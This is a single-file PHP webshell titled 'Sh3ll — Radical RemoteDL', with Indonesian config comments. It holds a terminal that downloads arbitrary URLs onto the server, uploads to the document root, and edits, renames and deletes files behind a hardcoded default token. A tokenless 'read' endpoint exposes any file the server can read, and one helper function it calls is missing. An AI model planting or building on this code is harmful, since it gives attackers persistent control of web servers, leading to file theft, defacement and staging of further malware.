<?php
// remotedl_radical.php
// Single-file webshell + terminal UI + secure remote-download + CRUD file ops
// CONFIG - ganti sebelum dipakai:
define('REMOTE_DL_TOKEN','el_R4d1c@l_#2025'); // wajib ganti
$REMOTE_DL_WHITELIST = []; // contoh ['example.com'] kosong = semua domain diizinkan
// END CONFIG

set_time_limit(0);
error_reporting(0);
header('X-Content-Type-Options: nosniff');

// -------------------- Utilities --------------------
function now(){ return date('Y-m-d H:i:s'); }
function jout($arr){ header('Content-Type: application/json'); echo json_encode($arr); exit; }
function safe_name($s){ return preg_replace('/[^A-Za-z0-9._-]/','_',$s); }
function is_token_ok($t){ return hash_equals(REMOTE_DL_TOKEN, (string)$t); }
function pwd_join($base,$rel){ $base=rtrim($base, "/\\"); return $base.DIRECTORY_SEPARATOR.ltrim($rel, "/\\"); }
function log_op($entry){
    $dir = getcwd();
    $f = $dir.DIRECTORY_SEPARATOR.'.remotedl_ops.log';
    @file_put_contents($f, json_encode($entry,JSON_UNESCAPED_SLASHES).PHP_EOL, FILE_APPEND|LOCK_EX);
}

// -------------------- Action endpoints (AJAX) --------------------
if ($_SERVER['REQUEST_METHOD']==='POST' && isset($_POST['api'])){
    $api = $_POST['api'];
    // Require token for mutating ops
    $token = $_POST['token'] ?? '';
    // helper to respond with standard structure
    if ($api === 'exec_cmd'){ // terminal command: only download allowed
        if (!is_token_ok($token)) jout(['ok'=>false,'msg'=>'Auth failed']);
        $cmd = trim($_POST['cmd'] ?? '');
        if ($cmd === '') jout(['ok'=>false,'msg'=>'Empty command']);
        $parts = preg_split('/\s+/', $cmd, 3);
        if (strtolower($parts[0] ?? '') !== 'download' || !isset($parts[1])){
            jout(['ok'=>false,'msg'=>'Allowed: download <url> [filename]']);
        }
        $url = $parts[1];
        $opt = $parts[2] ?? '';
        // validate URL
        if (!filter_var($url, FILTER_VALIDATE_URL)) jout(['ok'=>false,'msg'=>'Invalid URL']);
        $host = parse_url($url, PHP_URL_HOST) ?: '';
        global $REMOTE_DL_WHITELIST;
        if (!empty($REMOTE_DL_WHITELIST)){
            $ok=false; foreach($REMOTE_DL_WHITELIST as $d) if (stripos($host,$d)!==false){$ok=true;break;}
            if(!$ok) jout(['ok'=>false,'msg'=>'Domain not allowed']);
        }
        // compute target in current dir (client supplies current path)
        $cwd = realpath($_POST['cwd'] ?? getcwd());
        if ($cwd === false) $cwd = getcwd();
        $filename = $opt !== '' ? safe_name(basename($opt)) : safe_name(basename(rawurldecode(parse_url($url,PHP_URL_PATH)?:'download.bin')));
        $target = $cwd . DIRECTORY_SEPARATOR . $filename;
        // download via cURL or file_get_contents
        $ok=false; $err='';
        if (function_exists('curl_init')){
            $ch = curl_init($url);
            $fp = @fopen($target,'w');
            if ($fp){
                curl_setopt($ch, CURLOPT_FILE, $fp);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                curl_setopt($ch, CURLOPT_FAILONERROR, true);
                curl_setopt($ch, CURLOPT_TIMEOUT, 90);
                curl_exec($ch);
                $cerr = curl_error($ch);
                $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                curl_close($ch);
                fclose($fp);
                if (!$cerr && $code < 400 && is_file($target)) $ok=true; else { @unlink($target); $err = $cerr?:("HTTP {$code}"); }
            } else $err='Cannot write to target (permission?)';
        }
        if (!$ok){
            $ctx = stream_context_create(['http'=>['timeout'=>30],'https'=>['timeout'=>30]]);
            $data = @file_get_contents($url,false,$ctx);
            if ($data !== false){
                if (@file_put_contents($target,$data)!==false) $ok=true; else { @unlink($target); $err='Write failed'; }
            } else { if (!$err) $err='Download failed (no cURL & file_get_contents)'; }
        }
        log_op(['time'=>now(),'op'=>'download','url'=>$url,'target'=>$target,'ok'=>$ok?1:0,'err'=>$err,'ip'=>$_SERVER['REMOTE_ADDR']??'']);
        if ($ok) jout(['ok'=>true,'msg'=>"Saved: {$target}",'path'=>$target]);
        else jout(['ok'=>false,'msg'=>$err]);
    }

    // file delete
    if ($api === 'delete'){
        if (!is_token_ok($token)) jout(['ok'=>false,'msg'=>'Auth failed']);
        $path = $_POST['path'] ?? '';
        if ($path === '') jout(['ok'=>false,'msg'=>'No path']);
        $real = realpath($path);
        if ($real === false) jout(['ok'=>false,'msg'=>'Path not found']);
        // safety: disallow deleting script itself
        if (strpos($real, __FILE__) !== false) jout(['ok'=>false,'msg'=>'Refuse to delete script']);
        // permission check
        if (!is_writable($real)) jout(['ok'=>false,'msg'=>'Permission denied for unlink']);
        $res = is_dir($real) ? (xrmdir_ajax($real) ? true : false) : @unlink($real);
        log_op(['time'=>now(),'op'=>'delete','path'=>$real,'ok'=>$res?1:0,'ip'=>$_SERVER['REMOTE_ADDR']??'']);
        if ($res) jout(['ok'=>true,'msg'=>'Deleted']);
        else jout(['ok'=>false,'msg'=>'Delete failed (locked or permission)']);
    }

    // rename
    if ($api === 'rename'){
        if (!is_token_ok($token)) jout(['ok'=>false,'msg'=>'Auth failed']);
        $path = $_POST['path'] ?? ''; $new = $_POST['new'] ?? '';
        if ($path===''||$new==='') jout(['ok'=>false,'msg'=>'Missing path or new name']);
        $real = realpath($path); if ($real===false) jout(['ok'=>false,'msg'=>'Path not found']);
        $dir = dirname($real); $target = $dir.DIRECTORY_SEPARATOR.safe_name(basename($new));
        if (!is_writable($dir)) jout(['ok'=>false,'msg'=>'Parent dir not writable']);
        $ok = @rename($real,$target);
        log_op(['time'=>now(),'op'=>'rename','from'=>$real,'to'=>$target,'ok'=>$ok?1:0,'ip'=>$_SERVER['REMOTE_ADDR']??'']);
        if ($ok) jout(['ok'=>true,'msg'=>'Renamed','path'=>$target]);
        else jout(['ok'=>false,'msg'=>'Rename failed (permission or exists)']);
    }

    // edit (save file)
    if ($api === 'edit'){
        if (!is_token_ok($token)) jout(['ok'=>false,'msg'=>'Auth failed']);
        $path = $_POST['path'] ?? ''; $content = $_POST['content'] ?? '';
        if ($path==='') jout(['ok'=>false,'msg'=>'No file']);
        $real = realpath($path);
        if ($real===false || !is_file($real)) jout(['ok'=>false,'msg'=>'File not found']);
        if (!is_writable($real)) jout(['ok'=>false,'msg'=>'File not writable']);
        $w = @file_put_contents($real, $content);
        log_op(['time'=>now(),'op'=>'edit','path'=>$real,'len'=>is_numeric($w)?$w:0,'ok'=>$w!==false?1:0,'ip'=>$_SERVER['REMOTE_ADDR']??'']);
        if ($w!==false) jout(['ok'=>true,'msg'=>'Saved']);
        else jout(['ok'=>false,'msg'=>'Write failed']);
    }

    // quick file read (no token)
    if ($api === 'read'){
        $path = $_POST['path'] ?? '';
        if ($path==='') jout(['ok'=>false,'msg'=>'No file']);
        $real = realpath($path);
        if ($real===false || !is_file($real)) jout(['ok'=>false,'msg'=>'Not found']);
        $data = @file_get_contents($real);
        if ($data===false) jout(['ok'=>false,'msg'=>'Cannot read (permission?)']);
        jout(['ok'=>true,'content'=>$data,'path'=>$real]);
    }

    // unknown
    jout(['ok'=>false,'msg'=>'Unknown api']);
}

// -------------------- Helper for directory recursive delete (used in AJAX) --------------------
function xrmdir_ajax($dir){
    $items = @scandir($dir);
    if ($items === false) return false;
    foreach($items as $it){
        if ($it=='.' || $it=='..') continue;
        $p = $dir.DIRECTORY_SEPARATOR.$it;
        if (is_dir($p)) { if (!xrmdir_ajax($p)) return false; }
        else { if (!@unlink($p)) return false; }
    }
    return @rmdir($dir);
}

// -------------------- Page rendering (radical dark CSS + terminal + panels) --------------------
// determine current browsing directory
$lokasi = isset($_GET['path']) ? $_GET['path'] : getcwd();
$lokasi = str_replace(['\\'],'/',$lokasi);
$lokasi = realpath($lokasi) ?: getcwd();
$listing = @scandir($lokasi);
function esc($s){ return htmlspecialchars($s, ENT_QUOTES); }

// CSS + minimal JS
?>
<!doctype html>
<html lang="en"><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sh3ll — Radical RemoteDL</title>
<style>
:root{
  --bg:#07060a;
  --panel:#0b0b0f;
  --accent:#7cffb2;
  --accent2:#00d4ff;
  --muted:#7a8b8c;
  --danger:#ff6b6b;
  --card:#07090b;
  --glass:rgba(255,255,255,0.03);
  --mono: 'Courier New',monospace;
}
*{box-sizing:border-box}
html,body{height:100%;margin:0;background:radial-gradient(circle at 10% 10%, #0b0d12 0%, #050406 40%, #050306 100%);color:#cfe;font-family:Inter,system-ui,Segoe UI,Arial}
.container{max-width:1200px;margin:18px auto;padding:18px}
.header{display:flex;align-items:center;gap:12px;justify-content:space-between}
.brand{font-family:var(--mono);color:var(--accent);font-size:20px;letter-spacing:2px}
.path{color:var(--muted)}
.toolbar{display:flex;gap:8px;align-items:center}
.btn{background:linear-gradient(180deg,rgba(255,255,255,0.02),rgba(255,255,255,0.01));border:1px solid var(--glass);color:var(--accent);padding:8px 12px;border-radius:8px;cursor:pointer}
.btn.warn{color:var(--danger)}
.layout{display:grid;grid-template-columns:1fr 420px;gap:16px;margin-top:16px}
.card{background:linear-gradient(180deg,rgba(255,255,255,0.01),rgba(255,255,255,0.0));border:1px solid var(--glass);padding:12px;border-radius:10px}
.table{width:100%;border-collapse:collapse;color:#bfe}
.table th{background:linear-gradient(90deg,#071,#041);text-align:left;padding:10px;color:#cfe;font-size:14px}
.table td{padding:10px;border-top:1px solid rgba(255,255,255,0.02)}
.link{color:var(--accent2)}
.small{font-size:13px;color:var(--muted)}
.terminal{background:#000;border:1px solid rgba(0,255,120,0.06);padding:12px;border-radius:8px;color:#7cffb2;font-family:var(--mono);height:320px;display:flex;flex-direction:column}
.console{flex:1;overflow:auto;padding:8px;border-radius:6px;background:linear-gradient(180deg, rgba(0,0,0,0.6), rgba(0,0,0,0.2));}
.input-row{display:flex;gap:8px;margin-top:8px}
.input{flex:1;padding:8px;border-radius:6px;background:#041214;border:1px solid rgba(255,255,255,0.02);color:#9ff;font-family:var(--mono)}
.mono{font-family:var(--mono);color:#9ff}
.form-inline{display:flex;gap:8px;align-items:center}
.file-upload{display:flex;gap:8px;align-items:center;margin-top:10px}
.log{font-size:12px;color:var(--muted);margin-top:8px;border-top:1px dashed rgba(255,255,255,0.02);padding-top:8px}
.footer{text-align:center;color:var(--muted);margin-top:18px}
.controls select,input[type=text]{background:#071018;border:1px solid rgba(255,255,255,0.02);color:#cfe;padding:6px;border-radius:6px}
@media(max-width:980px){ .layout{grid-template-columns:1fr} .terminal{height:240px} }
</style>
</head><body>
<div class="container">
  <div class="header">
    <div>
      <div class="brand">Sh3ll</div>
      <div class="path small">Directory : <span class="mono"><?php echo esc($lokasi); ?></span></div>
    </div>
    <div class="toolbar">
      <button class="btn" onclick="location.href='?path=<?php echo urlencode($lokasi); ?>'">Refresh</button>
      <button class="btn" onclick="location.href='?act=remotedl&path=<?php echo urlencode($lokasi); ?>'">RemoteDL</button>
      <button class="btn" onclick="document.getElementById('uploader').scrollIntoView()">Upload</button>
    </div>
  </div>

  <div class="layout">
    <div class="card">
      <h3 class="small">Files</h3>
      <div style="overflow:auto;max-height:520px">
        <table class="table">
          <tr><th>Name</th><th>Size</th><th>Perm</th><th>Options</th></tr>
          <?php
          if (is_array($listing)){
            foreach($listing as $e){
                if ($e=='.' || $e=='..') continue;
                $full = $lokasi.DIRECTORY_SEPARATOR.$e;
                $isdir = is_dir($full);
                $size = $isdir?'--':(is_file($full)?round(filesize($full)/1024,2).' KB':'-');
                echo "<tr>";
                $link = $isdir ? "?path=".urlencode($full) : "?fileloc=".urlencode($full);
                echo "<td>".($isdir? "<a class='link' href='{$link}'>".esc($e)."</a>": "<a class='link' href='{$link}'>".esc($e)."</a>")."</td>";
                echo "<td>".esc($size)."</td>";
                echo "<td>".esc(statusnya($full))."</td>";
                // options: delete rename edit (ajax)
                echo "<td>";
                echo "<div class='form-inline'>";
                echo "<button class='btn' onclick=\"doEdit('".esc($full)."')\">Edit</button>";
                echo "<button class='btn' onclick=\"doRename('".esc($full)."')\">Rename</button>";
                echo "<button class='btn warn' onclick=\"doDelete('".esc($full)."')\">Delete</button>";
                echo "</div></td></tr>";
            }
          } else {
            echo "<tr><td colspan=4 class='small'>Cannot read directory. Permission or server restriction.</td></tr>";
          }
          ?>
        </table>
      </div>

      <div id="uploader" class="file-upload">
        <form id="fupload" enctype="multipart/form-data" method="post">
          <input type="file" name="file" />
          <select name="targetdir"><option value="current">current_dir</option><option value="docroot">document_root</option></select>
          <button class="btn" type="button" onclick="uploadFile()">Upload</button>
        </form>
        <div class="log" id="uplog"></div>
      </div>

      <div class="log" id="mainlog">Log: operations will appear here.</div>
    </div>

    <div>
      <div class="card terminal" id="terminalCard">
        <div class="console" id="consoleOut"></div>
        <div class="input-row">
          <input id="cmd" class="input" placeholder="download https://example.com/file.zip optional_name.zip" />
          <button class="btn" id="runBtn">Run</button>
        </div>
        <div class="small log">Terminal: only <code>download &lt;url&gt; [filename]</code> allowed. Token required for actions.</div>
      </div>

      <div class="card" style="margin-top:12px">
        <h4 class="small">Quick controls</h4>
        <div class="small">Token (set in config). Do not expose token publicly.</div>
        <div style="margin-top:8px">
          <input id="token" type="text" placeholder="paste token here" style="width:100%;padding:8px;border-radius:6px;background:#021214;color:#cfe">
        </div>
        <div style="margin-top:8px"><button class="btn" onclick="viewLog()">View dl.log</button> <button class="btn" onclick="clearConsole()">Clear</button></div>
        <pre id="logview" style="margin-top:8px;display:none;background:#061214;padding:8px;border-radius:6px;color:#9ff;height:160px;overflow:auto"></pre>
      </div>
    </div>
  </div>

  <div class="footer">© Sh3ll — <?php echo date('Y'); ?> — <?php echo esc($_SERVER['SERVER_NAME'] ?? 'local'); ?></div>
</div>

<script>
const consoleEl = document.getElementById('consoleOut');
const tokenEl = document.getElementById('token');
const cwd = "<?php echo addslashes($lokasi); ?>";

function appendLine(msg, cls=''){
  const d = document.createElement('div');
  d.textContent = msg;
  if (cls) d.className = cls;
  consoleEl.appendChild(d);
  consoleEl.scrollTop = consoleEl.scrollHeight;
}
function clearConsole(){ consoleEl.innerHTML=''; }

document.getElementById('runBtn').addEventListener('click', runCmd);
document.getElementById('cmd').addEventListener('keydown', e => { if (e.key==='Enter') runCmd(); });

async function runCmd(){
  const cmd = document.getElementById('cmd').value.trim();
  const token = tokenEl.value.trim();
  if (!cmd){ appendLine('Empty command',''); return; }
  appendLine('> '+cmd);
  appendLine('Running...');
  const fd = new FormData();
  fd.append('api','exec_cmd');
  fd.append('cmd',cmd);
  fd.append('token',token);
  fd.append('cwd',cwd);
  try {
    const r = await fetch('', {method:'POST', body:fd});
    const j = await r.json();
    if (j.ok) appendLine(j.msg);
    else appendLine('ERR: '+j.msg);
  } catch(e){ appendLine('Network error: '+e.message); }
}

async function uploadFile(){
  const f = document.querySelector('input[name=file]').files[0];
  const dir = document.querySelector('select[name=targetdir]').value;
  const fd = new FormData(); fd.append('upload', '1'); fd.append('u_file', f);
  fd.append('dir', dir);
  const out = document.getElementById('uplog');
  out.textContent = 'Uploading...';
  try {
    const r = await fetch(window.location.href, { method:'POST', body:fd });
    const text = await r.text();
    out.textContent = text;
    location.reload();
  } catch(e){
    out.textContent = 'Upload error: '+e.message;
  }
}

async function doDelete(path){
  if (!confirm('Delete '+path+' ?')) return;
  const token = tokenEl.value.trim();
  const fd = new FormData(); fd.append('api','delete'); fd.append('path', path); fd.append('token', token);
  const r = await fetch('', {method:'POST', body:fd}); const j = await r.json();
  alert(j.msg); if (j.ok) location.reload();
}

async function doRename(path){
  const n = prompt('New name for '+path, path.split('/').pop());
  if (n === null) return;
  const token = tokenEl.value.trim();
  const fd = new FormData(); fd.append('api','rename'); fd.append('path', path); fd.append('new', n); fd.append('token', token);
  const r = await fetch('', {method:'POST', body:fd}); const j = await r.json();
  alert(j.msg); if (j.ok) location.reload();
}

async function doEdit(path){
  const token = tokenEl.value.trim();
  const fd = new FormData(); fd.append('api','read'); fd.append('path', path);
  const r = await fetch('', {method:'POST', body:fd}); const j = await r.json();
  if (!j.ok){ alert(j.msg); return; }
  const newc = prompt('Edit file: '+path, j.content);
  if (newc === null) return;
  const fd2 = new FormData(); fd2.append('api','edit'); fd2.append('path', path); fd2.append('content', newc); fd2.append('token', token);
  const r2 = await fetch('', {method:'POST', body:fd2}); const j2 = await r2.json();
  alert(j2.msg); if (j2.ok) location.reload();
}

async function viewLog(){
  const token = tokenEl.value.trim();
  const fd = new FormData(); fd.append('api','read'); fd.append('path', cwd + '/dl.log');
  const r = await fetch('', {method:'POST', body:fd}); const j = await r.json();
  const v = document.getElementById('logview');
  if (!j.ok){ v.style.display='block'; v.textContent = 'No log or cannot read: ' + j.msg; return; }
  v.style.display='block'; v.textContent = j.content;
}
</script>
</body></html>
<?php
// -------------------- Server-side upload handling (non-AJAX) --------------------
if ($_SERVER['REQUEST_METHOD']==='POST' && isset($_POST['upload']) && isset($_FILES['u_file'])){
    $diropt = $_POST['dir'] ?? 'current';
    $base = ($diropt==='docroot' && isset($_SERVER['DOCUMENT_ROOT'])) ? rtrim($_SERVER['DOCUMENT_ROOT'],'/\\') : $lokasi;
    $up = $_FILES['u_file'];
    $name = safe_name($up['name'] ?? 'upload.bin');
    $dst = $base . DIRECTORY_SEPARATOR . $name;
    if (!is_uploaded_file($up['tmp_name'])) { echo "Upload failed: tmp file error"; exit; }
    if (@move_uploaded_file($up['tmp_name'], $dst)) {
        echo "Uploaded to: {$dst}";
        log_op(['time'=>now(),'op'=>'upload','path'=>$dst,'ip'=>$_SERVER['REMOTE_ADDR']??'']);
    } else {
        echo "Upload failed: permission or target path error.";
    }
    exit;
}
?>
